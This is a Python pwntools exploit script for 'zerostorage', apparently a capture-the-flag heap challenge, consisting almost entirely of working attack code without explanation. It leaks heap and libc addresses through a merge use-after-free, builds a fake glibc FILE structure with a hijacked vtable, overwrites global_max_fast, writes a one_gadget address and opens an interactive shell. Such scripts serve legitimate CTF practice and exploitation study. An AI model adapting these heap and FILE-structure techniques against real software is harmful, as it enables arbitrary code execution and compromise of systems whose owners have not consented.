from pwn import *
context(arch='amd64',os='linux',log_level='debug')
#io = process('LD_PRELOAD=./a ./zerostorage',shell=True)
io = process('./zerostorage')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

ru = lambda x : io.recvuntil(x,drop=True)
rn = lambda x : io.recv(x)
r = lambda x : io.recv()
sl = lambda x : io.sendline(x)
s = lambda x : io.send(x)

def insert(content):
	ru('Your choice: ')
	sl('1')
	ru('Length of new entry: ')
	sl(str(len(content)))
	ru('Enter your data: ')
	s(content)
	
def update(idx,content):
	ru('Your choice: ')
	sl('2')
	ru('Entry ID: ')
	sl(str(idx))
	ru('Length of entry: ')
	sl(str(len(content)))
	ru('Enter your data: ')
	s(content)
	
def merge(idx1,idx2):
	ru('Your choice: ')
	sl('3')
	ru('Merge from Entry ID: ')
	sl(str(idx1))
	ru('Merge to Entry ID: ')
	sl(str(idx2))
	ru('New entry ID is ')
	return int(ru('.'))
	
def delete(idx):
	ru('Your choice: ')
	sl('4')
	ru('Entry ID: ')
	sl(str(idx))
	
def view(idx):
	ru('Your choice: ')
	sl('5')
	ru('Entry ID: ')
	sl(str(idx))
	ru(':\n')
	return rn(16)
	
def build_fake_file(addr,vtable):
	flag=0xfbad2887
	#flag&=~4
	#flag|=0x800
	fake_file=p64(flag)               #_flags
	fake_file+=p64(addr)             #_IO_read_ptr
	fake_file+=p64(addr)             #_IO_read_end
	fake_file+=p64(addr)             #_IO_read_base
	fake_file+=p64(addr)             #_IO_write_base
	fake_file+=p64(addr+1)             #_IO_write_ptr
	fake_file+=p64(addr)         #_IO_write_end
	fake_file+=p64(addr)                    #_IO_buf_base
	fake_file+=p64(0)                    #_IO_buf_end
	fake_file+=p64(0)                       #_IO_save_base
	fake_file+=p64(0)                       #_IO_backup_base
	fake_file+=p64(0)                       #_IO_save_end
	fake_file+=p64(0)                       #_markers
	fake_file+=p64(0)                       #chain   could be a anathor file struct
	fake_file+=p32(1)                       #_fileno
	fake_file+=p32(0)                       #_flags2
	fake_file+=p64(0xffffffffffffffff)      #_old_offset
	fake_file+=p16(0)                       #_cur_column
	fake_file+=p8(0)                        #_vtable_offset
	fake_file+=p8(0x10)                      #_shortbuf
	fake_file+=p32(0)
	fake_file+=p64(0)                    #_lock
	fake_file+=p64(0xffffffffffffffff)      #_offset
	fake_file+=p64(0)                       #_codecvt
	fake_file+=p64(0)                    #_wide_data
	fake_file+=p64(0)                       #_freeres_list
	fake_file+=p64(0)                       #_freeres_buf
	fake_file+=p64(0)                       #__pad5
	fake_file+=p32(0xffffffff)              #_mode
	fake_file+=p32(0)                       #unused2
	fake_file+=p64(0)*2                     #unused2
	fake_file+=p64(vtable)                       #vtable
	return fake_file

insert('a'*16)			#0
insert('a'*16)			#1
insert('a'*16)			#2
insert('a'*16)			#3
insert('a'*16)			#4
insert('a'*16)			#5
insert((0x1000)*'a')	#6
insert(0x400*'a')		#7
insert('a'*16)				#8
insert(0x60*'a')		#9
merge(7,6)				#10
delete(2)
merge(0,0)			#2
leak = view(2)
heap_base = u64(leak[:8]) & 0xfffffffffffff000
leak_addr = u64(leak[8:])
libc_base = leak_addr - 88 - 0x3c4b20
libc.address = libc_base
global_max_fast = libc_base + 0x3c67f8
one_gadget=libc_base+0xf1147	# 0x45216 0x4526a 0xf02a4 0xf1147
log.success('libc base: '+hex(libc_base))
log.success('heap base: '+hex(heap_base))
fake_file = build_fake_file(0,heap_base+0x90*7+0x1010+0x410)
insert(0x400*'a')
insert(0x1000*'a')
update(6,fake_file[0x10:].ljust(0x1000,'a'))
merge(0,6)
update(9,p64(one_gadget)*(0x50/8))
insert('a'*16)
insert('a'*16)
merge(4,4)
update(11,p64(leak_addr)+p64(global_max_fast-0x10))
insert('a'*16)
delete(7)
sl('7')
io.interactive()
